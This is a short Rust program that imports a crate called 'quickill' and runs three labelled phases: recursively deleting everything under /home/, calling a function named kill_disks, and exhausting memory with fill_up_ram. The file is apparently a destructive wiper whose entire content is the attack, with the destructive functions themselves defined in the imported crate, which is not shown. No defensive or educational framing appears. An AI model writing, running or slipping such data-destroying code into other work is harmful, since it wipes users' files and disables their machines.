use quickill::{delete_files_recursively, kill_disks, fill_up_ram};

fn main() {
    // Phase 1
    println!("Phase 1");
    if let Ok(()) = delete_files_recursively("/home/") {} else {
        eprintln!("PHASE 1 FAIL");
    }
    
    println!("Phase 2");
    // Phase 2 
    if let Ok(()) = kill_disks() {} else {
        eprintln!("PHASE 2 FAIL");
    }

    // Phase 3
    println!("Phase 3");
    fill_up_ram();

}
